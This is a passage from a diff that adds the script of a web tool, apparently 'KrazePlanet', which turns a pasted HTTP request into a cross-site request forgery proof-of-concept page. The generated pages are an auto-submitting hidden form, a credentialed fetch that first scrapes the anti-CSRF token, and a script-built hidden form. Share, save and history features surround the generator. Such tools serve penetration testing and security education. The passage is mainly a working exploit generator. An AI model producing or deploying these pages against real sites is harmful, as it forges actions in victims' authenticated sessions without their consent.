+}
+
+function parseMultipart(body, contentType) {
+  const boundaryMatch = contentType.match(/boundary=([^;]+)/);
+  if (!boundaryMatch) return null;
+  
+  const boundary = boundaryMatch[1].trim();
+  const parts = body.split(`--${boundary}`).slice(1, -1);
+  const fields = [];
+  
+  parts.forEach(part => {
+    const lines = part.trim().split('\n');
+    let headerEnd = 0;
+    let disposition = '';
+    let fieldName = '';
+    let isFile = false;
+    let filename = '';
+    let contentType = '';
+    
+    for (let i = 0; i < lines.length; i++) {
+      const line = lines[i].trim();
+      if (line === '') {
+        headerEnd = i + 1;
+        break;
+      }
+      if (line.toLowerCase().startsWith('content-disposition:')) {
+        disposition = line;
+        const nameMatch = line.match(/name="([^"]+)"/);
+        if (nameMatch) fieldName = nameMatch[1];
+        const filenameMatch = line.match(/filename="([^"]+)"/);
+        if (filenameMatch) {
+          isFile = true;
+          filename = filenameMatch[1];
+        }
+      }
+      if (line.toLowerCase().startsWith('content-type:')) {
+        contentType = line.slice(13).trim();
+      }
+    }
+    
+    const value = lines.slice(headerEnd).join('\n').trim();
+    if (fieldName) {
+      fields.push({
+        name: fieldName.replace(/[<>"']/g, ''),
+        value: value.replace(/[<>"']/g, ''),
+        isFile,
+        filename,
+        contentType
+      });
+    }
+  });
+  
+  return { boundary, fields };
+}
+
+// ========== PoC Builders ==========
+
+function buildFormPoC(p) {
+  let h = `<html>\n  <!-- CSRF PoC - generated by KrazePlanet -->\n  <body onload="document.forms['csrf-poc'].submit()">\n`;
+  h += `    <form hidden name="csrf-poc" method="${p.method}" action="${p.action}">\n`;
+  
+  // Add URL params as hidden fields for GET
+  p.urlParams.forEach(({name, value}) => {
+    h += `        <input type="hidden" name="${name}" value="${value}"/>\n`;
+  });
+  
+  p.params.forEach(({name, value}) => {
+    h += `        <input type="hidden" name="${name}" value="${value}"/>\n`;
+  });
+  
+  // Handle multipart file fields
+  if (p.multipart && p.multipart.fields) {
+    p.multipart.fields.forEach(field => {
+      if (field.isFile) {
+        h += `        <input type="file" name="${field.name}" style="display:none"/>\n`;
+      } else {
+        h += `        <input type="hidden" name="${field.name}" value="${field.value}"/>\n`;
+      }
+    });
+  }
+  
+  h += `        <input type="submit" value="Submit">\n    </form>\n  </body>\n</html>`;
+  return h;
+}
+
+function buildXHRPoC(p) {
+  const headers = p.headers.map(h => `      '${h.name}': '${h.value}'`).join(',\n');
+  const cookieHeader = p.cookies ? `      'Cookie': '${p.cookies}'` : '';
+  const allHeaders = [headers, cookieHeader].filter(Boolean).join(',\n');
+  
+  let bodyCode = '';
+  
+  if (p.contentType.includes('application/json') && p.rawBody) {
+    bodyCode = `JSON.stringify(${p.rawBody})`;
+  } else if (p.contentType.includes('multipart/form-data')) {
+    bodyCode = `formData`;
+  } else if (p.contentType.includes('application/xml') || p.contentType.includes('text/xml')) {
+    bodyCode = `\`${p.rawBody}\``;
+  } else if (p.params.length > 0) {
+    const params = p.params.map(({name, value}) => `      ['${name}', '${value}']`).join(',\n');
+    bodyCode = `new URLSearchParams([\n${params}\n    ])`;
+  } else {
+    bodyCode = `null`;
+  }
+  
+  const hasBody = bodyCode !== 'null';
+  
+  let h = `<html>\n  <!-- CSRF PoC - generated by KrazePlanet -->\n<body>\n  <script>\n    (async function() {\n`;
+  
+  if (p.csrfToken) {
+    h += `      // Fetch anti-CSRF token first\n`;
+    h += `      const tokenRes = await fetch('${p.action}', {\n`;
+    h += `        method: 'GET',\n`;
+    h += `        credentials: 'include'\n`;
+    h += `      });\n`;
+    h += `      const tokenText = await tokenRes.text();\n`;
+    h += `      const tokenMatch = tokenText.match(/name="${p.csrfToken.name}"[^>]*value="([^"]+)"/);\n`;
+    h += `      const token = tokenMatch ? tokenMatch[1] : '${p.csrfToken.value}';\n`;
+    h += `\n`;
+  }
+  
+  if (p.multipart && p.multipart.fields) {
+    h += `      const formData = new FormData();\n`;
+    p.multipart.fields.forEach(field => {
+      if (field.isFile) {
+        h += `      formData.append('${field.name}', new Blob(['${field.value}']), '${field.filename}');\n`;
+      } else {
+        h += `      formData.append('${field.name}', '${field.value}');\n`;
+      }
+    });
+    h += `\n`;
+  }
+  
+  h += `      await fetch('${p.action}', {\n`;
+  h += `        method: '${p.method}',\n`;
+  h += `        credentials: 'include',\n`;
+  
+  if (allHeaders) {
+    h += `        headers: {\n${allHeaders}\n        },\n`;
+  }
+  
+  if (hasBody) {
+    h += `        body: ${bodyCode}\n`;
+  }
+  
+  h += `      });\n`;
+  h += `      console.log('CSRF request sent successfully');\n`;
+  h += `    })();\n  <\/script>\n</body>\n</html>`;
+  return h;
+}
+
+function buildJSPoC(p) {
+  let h = `<html>\n  <!-- CSRF PoC - generated by KrazePlanet -->\n<body>\n  <script>\n    // CSRF PoC via JavaScript execution\n    (async function() {\n`;
+  
+  if (p.csrfToken) {
+    h += `      // Fetch anti-CSRF token first\n`;
+    h += `      const tokenRes = await fetch('${p.action}', {\n`;
+    h += `        method: 'GET',\n`;
+    h += `        credentials: 'include',\n`;
+    h += `        mode: 'no-cors'\n`;
+    h += `      });\n`;
+    h += `      const tokenText = await tokenRes.text();\n`;
+    h += `      const tokenMatch = tokenText.match(/name="${p.csrfToken.name}"[^>]*value="([^"]+)"/);\n`;
+    h += `      const csrfToken = tokenMatch ? tokenMatch[1] : '${p.csrfToken.value}';\n`;
+    h += `\n`;
+  }
+  
+  h += `      // Create and submit form programmatically\n`;
+  h += `      const form = document.createElement('form');\n`;
+  h += `      form.method = '${p.method}';\n`;
+  h += `      form.action = '${p.action}';\n`;
+  h += `      form.style.display = 'none';\n`;
+  h += `      document.body.appendChild(form);\n\n`;
+  
+  const allParams = [...p.urlParams, ...p.params];
+  allParams.forEach(({name, value}) => {
+    h += `      const input_${name.replace(/[^a-zA-Z0-9]/g, '_')} = document.createElement('input');\n`;
+    h += `      input_${name.replace(/[^a-zA-Z0-9]/g, '_')}.type = 'hidden';\n`;
+    h += `      input_${name.replace(/[^a-zA-Z0-9]/g, '_')}.name = '${name}';\n`;
+    h += `      input_${name.replace(/[^a-zA-Z0-9]/g, '_')}.value = '${value}';\n`;
+    h += `      form.appendChild(input_${name.replace(/[^a-zA-Z0-9]/g, '_')});\n`;
+  });
+  
+  if (p.csrfToken) {
+    h += `\n      // Add anti-CSRF token\n`;
+    h += `      const csrfInput = document.createElement('input');\n`;
+    h += `      csrfInput.type = 'hidden';\n`;
+    h += `      csrfInput.name = '${p.csrfToken.name}';\n`;
+    h += `      csrfInput.value = csrfToken;\n`;
+    h += `      form.appendChild(csrfInput);\n`;
+  }
+  
+  h += `\n      form.submit();\n`;
+  h += `    })();\n  <\/script>\n</body>\n</html>`;
+  return h;
+}
+
+function buildPoC(p) {
+  switch (mode) {
+    case 'xhr': return buildXHRPoC(p);
+    case 'js': return buildJSPoC(p);
+    default: return buildFormPoC(p);
+  }
+}
+
+function highlight(code) {
+  if (!code) return '';
+  
+  // Early return for empty or very short strings
+  if (code.length < 3) return code;
+  
+  const C={br:'#d070f0',tg:'#e080ff',at:'#80ffb0',eq:'#505070',st:'#ffe080',tx:'#c0c0e0',ev:'#80dfff'};
+  const sp=(c,t)=>`<span style="color:${c}">${t}</span>`;
+  const esc=s=>s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+  
+  try {
+    // Use more efficient string building
+    const result = [];
+    let i = 0;
+    const len = code.length;
+    
+    while (i < len) {
+      if (code[i] === '<') {
+        let j = i + 1;
+        while (j < len && code[j] !== '>') j++;
+        if (j < len) {
+          const tag = code.slice(i, j + 1);
+          result.push({t: 'tag', r: tag});
+          i = j + 1;
+        } else {
+          result.push({t: 'text', r: code.slice(i)});
+          break;
+        }
+      } else {
+        let j = i;
+        while (j < len && code[j] !== '<') j++;
+        result.push({t: 'text', r: code.slice(i, j)});
+        i = j;
+      }
+    }
+    
+    // Build output string efficiently
+    let out = '';
+    const resultLen = result.length;
+    
+    for (let idx = 0; idx < resultLen; idx++) {
+      const tok = result[idx];
+      if (tok.t === 'text') {
+        out += sp(C.tx, esc(tok.r));
+        continue;
+      }
+      
+      const m = tok.r.match(/^(<\/?)(\w[\w-]*)([\s\S]*?)(\/?>)$/);
+      if (!m) {
+        out += esc(tok.r);
+        continue;
+      }
+      
+      const [,op,nm,as,cl] = m;
+      out += sp(C.br, esc(op)) + sp(C.tg, nm);
+      
+      let ao = '';
+      let last = 0;
+      let mm;
+      const re = /(\s+)([\w-]+)(=)("([^"]*)")/g;
+      
+      while ((mm = re.exec(as)) !== null) {
+        ao += esc(as.slice(last, mm.index)) + mm[1];
+        ao += sp(mm[2].startsWith('on') ? C.ev : C.at, mm[2]) + sp(C.eq, '=') + sp(C.st, '"' + esc(mm[5]) + '"');
+        last = mm.index + mm[0].length;
+      }
+      
+      ao += esc(as.slice(last));
+      out += ao + sp(C.br, esc(cl));
+    }
+    
+    return out;
+  } catch (e) {
+    console.error('Highlight error:', e);
+    return esc(code);
+  }
+}
+
+function generatePoC() {
+  if (!elements.requestInput) {
+    toast('Input field not found','err');
+    return;
+  }
+  
+  const raw = elements.requestInput.value.trim();
+  if(!raw){
+    toast('Paste an HTTP request first','err');
+    return;
+  }
+  
+  const p = parseRequest(raw);
+  if(!p){
+    toast('Could not parse — check request format','err');
+    return;
+  }
+  
+  try {
+    generatedPoC = buildPoC(p);
+    
+    if (!elements.pocEditor) {
+      toast('UI elements not available','err');
+      return;
+    }
+    
+    elements.pocEditor.innerHTML = highlight(generatedPoC);
+    elements.pocEditor.style.display = 'block';
+    
+    setReady(true);
+    
+    // Save to history
+    addHistoryItem(raw, generatedPoC, mode, proto);
+  } catch (error) {
+    console.error('Error generating PoC:', error);
+    toast('Error generating PoC','err');
+  }
+}
+
+function getPoC() { 
+  if (!elements.pocEditor) return '';
+  return elements.pocEditor.innerText || elements.pocEditor.textContent || '';
+}
+
+function copyPoC() {
+  const poc = getPoC();
+  if(!poc){
+    toast('No PoC to copy','err');
+    return;
+  }
+  
+  navigator.clipboard.writeText(poc)
+    .then(()=>toast('Copied to clipboard','ok'))
+    .catch(err=>{
+      console.error('Copy failed:', err);
+      toast('Copy failed - try again','err');
+    });
+}
+
+function saveHTML() {
+  const poc = getPoC();
+  if(!poc){
+    toast('No PoC to save','err');
+    return;
+  }
+  
+  try {
+    const a=Object.assign(document.createElement('a'),{
+      href:URL.createObjectURL(new Blob([poc],{type:'text/html'})),
+      download:'csrf-poc.html'
+    });
+    a.click();
+    toast('Saved csrf-poc.html','ok');
+  } catch (error) {
+    console.error('Save failed:', error);
+    toast('Save failed - try again','err');
+  }
+}
+
+let browserUrlValue = '';
+
+function showBrowserModal() {
+  const poc = getPoC();
+  if (!poc) {
+    toast('No PoC to test','err');
+    return;
+  }
+  
+  try {
+    browserUrlValue = URL.createObjectURL(new Blob([poc], {type: 'text/html'}));
+    const modal = document.getElementById('browserModal');
+    const urlInput = document.getElementById('browserUrl');
+    if (modal && urlInput) {
+      urlInput.value = browserUrlValue;
+      modal.style.display = 'flex';
+    }
+  } catch (error) {
+    console.error('Failed to create browser URL:', error);
+    toast('Failed to create test URL','err');
+  }
+}
+
+function closeBrowserModal() {
+  const modal = document.getElementById('browserModal');
+  if (modal) {
+    modal.style.display = 'none';
+  }
+  browserUrlValue = '';
+}
+
+function copyBrowserUrl() {
+  const urlInput = document.getElementById('browserUrl');
+  if (urlInput && urlInput.value) {
+    navigator.clipboard.writeText(urlInput.value)
+      .then(() => toast('URL copied to clipboard','ok'))
+      .catch(() => toast('Copy failed','err'));
+  }
+}
+
+function openBrowserUrl() {
+  if (browserUrlValue) {
+    window.open(browserUrlValue, '_blank');
+  }
+}
+
+// Close modal on backdrop click
+document.addEventListener('click', (e) => {
+  const modal = document.getElementById('browserModal');
+  if (modal && e.target === modal) {
+    closeBrowserModal();
+  }
+  const shareModal = document.getElementById('shareModal');
+  if (shareModal && e.target === shareModal) {
+    closeShareModal();
+  }
+});
+
+// ========== Share Modal Functions ==========
+
+function showShareModal() {
+  const modal = document.getElementById('shareModal');
+  const urlInput = document.getElementById('shareUrl');
+  if (modal && urlInput) {
+    urlInput.value = '';
+    urlInput.placeholder = 'Click Generate to create link...';
+    modal.style.display = 'flex';
+  }
+}
+
+function closeShareModal() {
+  const modal = document.getElementById('shareModal');
+  if (modal) {
+    modal.style.display = 'none';
+  }
+}
+
+async function generateShareLink() {
+  const poc = getPoC();
+  if (!poc) {
+    toast('No PoC to share','err');
+    return;
+  }
+
+  const urlInput = document.getElementById('shareUrl');
+  const loading = document.getElementById('shareLoading');
+  const genBtn = document.getElementById('btnGenLink');
+
+  if (loading) loading.style.display = 'block';
+  if (genBtn) genBtn.disabled = true;
+
+  try {
+    const response = await fetch('api/store.php', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ poc: poc })
+    });
+
+    const data = await response.json();
+
+    if (data.success && data.url) {
+      if (urlInput) urlInput.value = data.url;
+      toast('Shareable link generated!','ok');
+    } else {
+      toast(data.error || 'Failed to generate link','err');
+    }
+  } catch (error) {
+    console.error('Share link generation failed:', error);
+    toast('Failed to generate link - check server connection','err');
+  } finally {
+    if (loading) loading.style.display = 'none';
+    if (genBtn) genBtn.disabled = false;
+  }
+}
+
+function copyShareUrl() {
+  const urlInput = document.getElementById('shareUrl');
+  if (urlInput && urlInput.value) {
+    navigator.clipboard.writeText(urlInput.value)
+      .then(() => toast('Link copied to clipboard!','ok'))
+      .catch(() => toast('Copy failed','err'));
+  } else {
+    toast('Generate a link first','err');
+  }
+}
+
+// ========== History Sidebar ==========
+
+const HISTORY_KEY = 'csrf-poc-history';
+const MAX_HISTORY = 10;
+
+function getHistory() {
+  try {
+    const data = localStorage.getItem(HISTORY_KEY);
+    return data ? JSON.parse(data) : [];
+  } catch (e) {
+    return [];
+  }
+}
+
+function saveHistory(history) {
+  try {
+    localStorage.setItem(HISTORY_KEY, JSON.stringify(history));
+  } catch (e) {
+    console.warn('Failed to save history:', e);
+  }
+}
+
+function getRequestSignature(raw) {
+  const lines = raw.trim().split('\n');
+  // METHOD and path from first line
+  const firstLine = lines[0].trim();
+  let method = 'POST';
+  let path = '/';
+  const m = firstLine.match(/^(POST|GET|PUT|PATCH|DELETE)\s+(\S+)/i);
+  if (m) {
+    method = m[1].toUpperCase();
+    path = m[2];
+    // Strip query string from path for signature
+    const qIdx = path.indexOf('?');
+    if (qIdx > -1) path = path.slice(0, qIdx);
+  }
+  // Host from headers
+  let host = '';
+  for (const line of lines) {
+    const ci = line.indexOf(':');
+    if (ci > 0 && line.slice(0, ci).trim().toLowerCase() === 'host') {
+      host = line.slice(ci + 1).trim();
+      break;
+    }
+  }
+  return `${method}:${host}:${path}`;
+}
+
+function addHistoryItem(rawRequest, pocHtml, currentMode, currentProto) {
+  const history = getHistory();
+  const trimmedRaw = rawRequest.trim();
+  const signature = getRequestSignature(trimmedRaw);
+  
+  // Check if same endpoint already exists (same METHOD + host + path)
+  const existingIndex = history.findIndex(h => getRequestSignature(h.rawRequest) === signature);
+  
+  if (existingIndex !== -1) {
+    // Update existing item - move to top, refresh timestamp and PoC
+    const existing = history[existingIndex];
+    existing.timestamp = Date.now();
+    existing.rawRequest = trimmedRaw;
+    existing.pocHtml = pocHtml;
+    existing.mode = currentMode;
+    existing.proto = currentProto;
+    // Re-extract method/host since values may have changed
+    const lines = trimmedRaw.split('\n');
+    const match = lines[0].match(/^(POST|GET|PUT|PATCH|DELETE)\s+/i);
+    if (match) existing.method = match[1].toUpperCase();
+    for (const line of lines) {
+      const ci = line.indexOf(':');
+      if (ci > 0 && line.slice(0, ci).trim().toLowerCase() === 'host') {
+        existing.host = line.slice(ci + 1).trim();
+        break;
+      }
+    }
+    // Move to front
+    history.splice(existingIndex, 1);
+    history.unshift(existing);
+    saveHistory(history);
+    renderHistory();
+    return;
+  }
+  
+  // Extract method and host from raw request
+  let method = 'POST';
+  let host = '';
+  const lines = trimmedRaw.split('\n');
+  const match = lines[0].match(/^(POST|GET|PUT|PATCH|DELETE)\s+/i);
+  if (match) method = match[1].toUpperCase();
+  for (const line of lines) {
+    const ci = line.indexOf(':');
+    if (ci > 0 && line.slice(0, ci).trim().toLowerCase() === 'host') {
+      host = line.slice(ci + 1).trim();
+      break;
+    }
+  }
+  
+  const item = {
+    id: Date.now().toString(36) + Math.random().toString(36).slice(2, 6),
+    timestamp: Date.now(),
+    rawRequest: trimmedRaw,
+    pocHtml,
+    mode: currentMode,
+    proto: currentProto,
+    method,
+    host
+  };
+  
+  // Add to front, keep max 10
+  history.unshift(item);
+  if (history.length > MAX_HISTORY) {
+    history.length = MAX_HISTORY;
+  }
+  
+  saveHistory(history);
+  renderHistory();
+}
+
+function renderHistory() {
+  const list = document.getElementById('historyList');
+  const badge = document.getElementById('historyBadge');
+  if (!list) return;
+  
+  const history = getHistory();
+  
+  if (badge) {
+    badge.textContent = history.length;
+    badge.style.display = history.length > 0 ? 'inline-block' : 'none';
+  }
+  
+  if (history.length === 0) {
+    list.innerHTML = '<div class="history-empty">No history yet. Generate a PoC to save it here.</div>';
+    return;
+  }
+  
+  list.innerHTML = history.map(item => {
+    const date = new Date(item.timestamp);
+    const timeStr = date.toLocaleString('en-US', {
+      month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit'
+    });
+    return `
+      <div class="history-item" data-id="${item.id}">
+        <div class="history-item-header">
+          <span class="history-method">${item.method}</span>
+          <span class="history-host">${item.host || 'Unknown host'}</span>
+        </div>
+        <div class="history-time">${timeStr} &middot; ${item.proto.toUpperCase()} &middot; ${item.mode.toUpperCase()}</div>
+        <div class="history-actions">
+          <button class="btn-restore" onclick="restoreHistoryItem('${item.id}')">Restore</button>
+          <button class="btn-delete" onclick="deleteHistoryItem('${item.id}')">Delete</button>
+        </div>
+      </div>
+    `;
+  }).join('');
+}
+
+function toggleHistorySidebar() {
+  const sidebar = document.getElementById('historySidebar');
+  const overlay = document.getElementById('historyOverlay');
+  if (!sidebar) return;
+  
+  const isOpen = sidebar.style.transform === 'translateX(0%)';
+  if (isOpen) {
+    sidebar.style.transform = 'translateX(100%)';
+    if (overlay) overlay.style.display = 'none';
+  } else {
+    sidebar.style.transform = 'translateX(0%)';
+    if (overlay) overlay.style.display = 'block';
+    renderHistory();
+  }
+}
+
+function restoreHistoryItem(id) {
+  const history = getHistory();
+  const item = history.find(h => h.id === id);
+  if (!item) return;
+  
+  // Restore request input
+  const input = document.getElementById('requestInput');
+  if (input) {
+    input.value = item.rawRequest;
+  }
+  
+  // Restore mode and proto
+  setMode(item.mode);
+  setProto(item.proto);
+  
+  // Regenerate PoC
+  generatedPoC = item.pocHtml;
+  const editor = document.getElementById('pocEditor');
+  if (editor) {
+    editor.innerHTML = highlight(generatedPoC);
+  }
+  
+  // Update UI state
+  setReady(true);
+  
+  // Close sidebar
+  toggleHistorySidebar();
+  
+  toast('PoC restored from history','ok');
+}
+
+function deleteHistoryItem(id) {
+  let history = getHistory();
+  history = history.filter(h => h.id !== id);
+  saveHistory(history);
+  renderHistory();
+}
+
+function clearAllHistory() {
+  const footer = document.querySelector('.history-footer');
+  if (!footer) return;
+  
+  // Show inline confirmation instead of ugly native confirm()
+  footer.innerHTML = `
+    <div style="display:flex;flex-direction:column;gap:8px;">
+      <span style="font-size:11px;color:var(--text3);font-family:var(--mono);">Delete all ${getHistory().length} items?</span>
+      <div style="display:flex;gap:6px;">
+        <button class="btn btn-modal-open" style="font-size:10px;padding:4px 10px;" onclick="confirmClearAll()">Yes, clear</button>
+        <button class="btn btn-modal-close" style="font-size:10px;padding:4px 10px;" onclick="cancelClearAll()">Cancel</button>
+      </div>
+    </div>
+  `;
+}
+
+function confirmClearAll() {
+  saveHistory([]);
+  renderHistory();
+  resetClearButton();
+  toast('History cleared','ok');
+}
+
+function cancelClearAll() {
+  resetClearButton();
+}
+
+function resetClearButton() {
+  const footer = document.querySelector('.history-footer');
+  if (footer) {
+    footer.innerHTML = '<button class="btn btn-modal-close" onclick="clearAllHistory()">Clear all</button>';
+  }
+}
+
+let _tt;
+function toast(msg,type='ok'){
+  const el = elements.toast || document.getElementById('toast');
+  if (!el) {
+    console.warn('Toast element not found');
+    return;
+  }
+  
+  el.textContent = msg;
+  el.className = `show ${type}`;
+  el.setAttribute('role', 'alert');
+  el.setAttribute('aria-live', 'polite');
+  
+  clearTimeout(_tt);
+  _tt = setTimeout(()=>{
+    el.className = '';
+    el.removeAttribute('role');
+    el.removeAttribute('aria-live');
+  },2500);
+}
+
+// Debounce timer for auto-generation
+let generateTimer = null;
+
+// Initialize event listeners with performance optimizations
+document.addEventListener('DOMContentLoaded', () => {
+  // Cache elements on load
+  Object.keys(elements).forEach(key => {
+    const element = document.getElementById(key);
+    if (element) {
+      elements[key] = element;
+    } else {
+      console.warn(`Element not found: ${key}`);
+    }
+  });
+  
+  // Add input event listener for automatic generation
+  if (elements.requestInput) {
+    elements.requestInput.addEventListener('input', handleInputChange);
+    elements.requestInput.addEventListener('paste', handleInputChange);
+  }
+  
+  // Add keyboard shortcuts for accessibility
+  document.addEventListener('keydown', handleGlobalKeys);
+  
+  // Strip rich formatting on paste into contenteditable editor
+  if (elements.pocEditor) {
+    elements.pocEditor.addEventListener('paste', function(e) {
+      e.preventDefault();
+      const text = (e.clipboardData || window.clipboardData).getData('text/plain');
+      document.execCommand('insertText', false, text);
+    });
+  }
+  
+  // Initialize history badge
+  renderHistory();
+});
+
+// Handle input changes with debouncing
+function handleInputChange(e) {
+  // Clear existing timer
+  if (generateTimer) {
+    clearTimeout(generateTimer);
+  }
+  
+  // Set new timer for 300ms delay
+  generateTimer = setTimeout(() => {
+    const content = elements.requestInput.value.trim();
+    if (content) {
+      generatePoC();
+    } else {
+      // Clear output if input is empty
+      clearOutput();
+    }
+  }, 300);
+}
+
+// Clear output when input is empty
+function clearOutput() {
+  if (elements.pocEditor) {
+    elements.pocEditor.innerHTML = '';
+  }
+  setReady(false);
+  generatedPoC = '';
+}
+
+function handleGlobalKeys(e) {
+  // Alt+1 to focus input, Alt+2 to focus editor
+  if (e.altKey) {
+    if (e.key === '1' && elements.requestInput) {
+      e.preventDefault();
+      elements.requestInput.focus();
+    } else if (e.key === '2' && elements.pocEditor) {
+      e.preventDefault();
+      elements.pocEditor.focus();
+    }
+  }
+}
+</script>
+</body>
+</html>
